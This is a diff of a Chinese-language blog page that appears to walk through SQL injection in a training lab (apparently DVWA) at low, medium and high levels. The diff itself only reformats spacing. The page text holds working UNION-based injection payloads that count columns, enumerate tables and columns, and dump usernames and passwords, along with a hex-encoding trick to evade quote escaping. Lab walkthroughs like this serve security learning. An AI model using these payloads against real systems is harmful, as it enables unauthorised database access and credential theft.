@@ -421,29 +421,29 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h3><p><strong>判断存在注入</strong></p>
+                <h3 id="LOW-级别"><a href="#LOW-级别" class="headerlink" title="LOW 级别"></a>LOW 级别</h3><p><strong>判断存在注入</strong></p>
 <p><code>?id=1</code>正常回显</p>
 <p><code>?id=1&#39;</code>报错</p>
 <p><code>?id=1&#39;--+</code>回显正常,说明存在符号型注入,闭合方式为<code>&#39;</code></p>
 <p><strong>爆字段</strong></p>
 <p><code>?id=1&#39; order by 2--+</code>回显正常</p>
-<p><code>?id=1&#39;+order+by+3--+</code>报错,说明字段数为2</p>
+<p><code>?id=1&#39;+order+by+3--+</code>报错,说明字段数为 2</p>
 <p><strong>报显示位</strong></p>
-<p><code>?id=&#39;+union+select+1,2--+</code>显示位1,2</p>
+<p><code>?id=&#39;+union+select+1,2--+</code>显示位 1,2</p>
 <p><strong>查表</strong></p>
 <p><code>?id=1&#39;+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--+</code></p>
 <p>报错<code>Illegal mix of collations for operation &#39;UNION&#39;</code></p>
-<p>通过百度,这是由于编码的某种问题造成的,可以使用16进制进行读取</p>
+<p>通过百度,这是由于编码的某种问题造成的,可以使用 16 进制进行读取</p>
 <p><code>?id=1&#39;+union+select+1,concat_ws(&#39;~&#39;,hex(table_name))+from+information_schema.tables+where+table_schema=database()--+</code></p>
 <p>之后再解码就好</p>
 <p><strong>查列</strong></p>
 <p><code>?id=1&#39;+union+select+1,concat_ws(&#39;~&#39;,hex(column_name))+from+information_schema.columns+where+table_name=&#39;users&#39;+and+table_schema=database()--+</code></p>
 <p><strong>查数据</strong></p>
 <p><code>?id=1&#39;+union+select+1,group_concat(hex(user),&#39;,&#39;,hex(password))+from+users--+</code></p>
-<p>也可以直接使用unhex函数<br><code>?id=1&#39;+union+select+1,group_concat(unhex(hex(user)),&#39;,&#39;,unhex(hex(password))+from+users--+</code></p>
-<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p>这关换成了post请求</p>
-<p>burp抓包,操作同low级别一样,发现单引号会被转义,查列的时候<code>where+table_name=&#39;users&#39;</code>可以转换为16进制<strong>users 的 十六进制为 0x75736572</strong></p>
-<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; union select user,password from users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>也可以直接使用 unhex 函数<br><code>?id=1&#39;+union+select+1,group_concat(unhex(hex(user)),&#39;,&#39;,unhex(hex(password))+from+users--+</code></p>
+<h3 id="medium-级别"><a href="#medium-级别" class="headerlink" title="medium 级别"></a>medium 级别</h3><p>这关换成了 post 请求</p>
+<p>burp 抓包,操作同 low 级别一样,发现单引号会被转义,查列的时候<code>where+table_name=&#39;users&#39;</code>可以转换为 16 进制<strong>users 的 十六进制为 0x75736572</strong></p>
+<h3 id="high-级别"><a href="#high-级别" class="headerlink" title="high 级别"></a>high 级别</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; union select user,password from users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>直接结束?</p>
 
